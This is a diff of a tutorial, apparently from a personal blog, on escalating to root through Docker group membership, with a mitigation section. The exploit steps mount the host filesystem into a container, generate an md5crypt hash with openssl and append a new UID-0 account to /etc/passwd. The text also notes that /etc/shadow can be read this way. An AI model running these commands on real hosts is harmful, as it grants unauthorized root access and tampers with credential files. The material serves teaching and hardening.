@@ -37,10 +37,10 @@ Virtual machines (VMs) are an abstraction of physical hardware turning one serve
 
 ### How does it work ?
 
-A container is run from an image. An image is built using a Dockerfile.
+A container is run from an image. An image is built using a Dockerfile. Here are some usefull commands:
 
 - **Docker Hub:**   
-By default connected to the Docker Hub https://hub.docker.com, a place which contains base images you can use to run a container.
+By default connected to the [Docker Hub](https://hub.docker.com), a place which contains base images you can use to run a container.
 
 - **Run a container:**   
 **`docker run -di --name flast101 alpine:latest`**   
@@ -52,34 +52,43 @@ By default connected to the Docker Hub https://hub.docker.com, a place which con
 -t: terminal   
 -i: interactive   
 
+- **Run to an interactive container with a shell:**   
+**`docker run --name flast101 alpine:latest sh`**   
+-t: terminal   
+-i: interactive   
+
 - **List containers:**      
 **`docker ps -a`**    
 
 - **remove a container:**   
 **`docker rm -f flast101`**   
 
+- **Create image from the Dockerfile:**   
+**`docker build -t myimage:version .`**   
+
 - **List images:**   
-**`docker image`**    
+**`docker images`**    
 
 - **Remove image**   
 **`docker image rm flast101:v1.0`**
 
 **Key points to understand:**
 - By default, any machine container is run with root privileges (ie. you have root privileges inside the container). It means that any user (by default, any member of the "docker" group) who has access to the Docker Daemon has root privileges in the container.
-- Sometimes you will want to remove a container and rerun it because you updated the image (or changed the docker file). If you need to remove a container, data changes you made are not persistent. We usually mount a host directory to access persistent data from the container. 
+- Sometimes you will want to remove a container and rerun it because you updated the image (or changed the Dockerfile). If you need to remove a container, data changes you made are not persistent. We usually mount a host directory to access persistent data from the container. 
 
-For example, you will run a container using the following command if you want to run a nginx server:   
+For example for a web site example, you will run a container using the following command if you want to run a nginx server:   
 ```
 docker run -tid -p 8080:80 -v /srv/data/nginx/:/usr/share/nginx/html/ --name flast101 nginx:latest
 ```   
-***/srv/data/nginx/*** is host directory to be shared. In this case, it contains the pages of your web site. And ***/usr/share/nginx/html/*** is the target directory in the container where the files are used.      
+***/srv/data/nginx/*** is host directory to be shared. In this case, it contains the pages of your web site.     
+***/usr/share/nginx/html/*** is the target directory in the container where the files are used.      
 That's great ! Your site contents are persistent, you can modify them independently from the web server, and you can update and maintain the web server without affecting the web site content. An (almost) perfect wolrd.
 
-Now, let's suppose you are the admin and you want John to be able to run a container. You add John in the "docker" group or give him the ability to run docker as a suders. Fine, John can handle the web site or any other application you want him to run/maintain.    
+Now, let's suppose you are the admin and you want John to be able to run a container for whatever reason. You add John in the "docker" group or give him the ability to run docker as a sudoer. Fine, John can handle the web site or any other application you want him to run/maintain.    
 **But what if John runs a container using this command:**
 **`docker run -tid -v /etc/:/mnt/ --name flast101 ubuntu:latest bash`**
 
-This is where security problems arise: he can easily read the "shadow" file, and he can also create a new root user by entering it directly in le "passwd" file... WTF are you doing John !? ;-)
+This is where security problems arise: he can easily read and writethe `**/etc/shadow`** file, and he can also create a new root user by entering it directly in the **`/etc/passwd`** file... WTF are you doing John !? ;-)
 
 ## 2- GTFOBins
 
@@ -100,7 +109,7 @@ But hey, if you are trying to get the root flag in a CTF, you have it.
 
 ## 3- Exploiting The Vulnerability
 
-Now we know everything about this, what should I do to exploit it properly.
+Now we know everything about this, what should I do to exploit it properly ?
 
 **1. Check if the active user can run the Docker daemon**   
 If you can not run it, you will get something like this:
@@ -112,14 +121,15 @@ If you can not run it, you will get something like this:
 
  
 
-**2. Prepare a new root user.**    
-With openssl, I can generate a password hashed with md5crypt which is valid in Linux. I choose a user **`$rootname`** with the password **`$passw`** and the salt **`$salt`** to generate the password hash. These will be variables in the script but should look like this: 
+**2. Prepare a new root user.** 
+The plan is to create a new root user by entering it directly in the **`/etc/passwd`** file.    
+With openssl, I can generate a password hashed with md5crypt which is valid in Linux. I choose a user **`$rootname`** with the password **`$passw`** and the salt **`$salt`** to generate the password hash. These will be variables in the script but with real values it should look like this: 
 ~~~
 user@linux:~$ openssl passwd -1 -salt evil newrootpass
 $1$evil$eu2ySQGNgNghQm4ASTnKa.
 ~~~
 
-**3. Prepare a file that contains the line I want to add to /etc/passwd on the host machine.**  
+**3. Prepare a file `new_account` that contains the line I want to add to `/etc/passwd` on the host machine.**  
 This line will look like this:
 ```
 user@linux:~$ cat new_account
@@ -131,7 +141,7 @@ newroot:$1$evil$eu2ySQGNgNghQm4ASTnKa.:0:0:root:/root:/bin/bash
 docker run -tid -v /:/mnt/ --name flast101 alpine
 ```
 
-**5. Execute a sh command in the container that will add the new root user to the /etc/passwd file:**    
+**5. Execute a bash command in the container that will add the new root user to the /etc/passwd file:**    
 ```
 docker exec -ti flast101 sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
 ```
@@ -144,7 +154,7 @@ docker exec -ti flast101 sh -c "cat /mnt/tmp/new_account >> /mnt/etc/passwd"
 Requirements:
 
 - Access to a shell on the target with a user which can run Docker.
-- The target should have either an internet connection or an image installed in Docker. Use `docker images` to check and change the "alpine" image accordingly. If there is no image go to https://hub.docker.com to get one and upload it on the target in your working directory.
+- The target should have either an internet connection or an image installed in Docker. Use **`docker images`** to check and change the "alpine" image accordingly. If there is no image go to [https://hub.docker.com](https://hub.docker.com) to get one (tar.gz file with its Dockerfile) and upload it on the target in your working directory.
 
 
 Now let's put this down in a bash script:
@@ -217,6 +227,16 @@ echo "
 systemctl daemon-reload && systemctl restart docker
 ```
 
+**Example:**    
+
+By default, the process is run as root in the container:
+
+![nomitig.png](nomitig.png "nomitig.png")
+
+Applying the mitigation, we can get rid of this problem. The user "dockremap" is now running the process:
+
+
+![mitig.png](mitig.png "mitig.png")
 
 
 
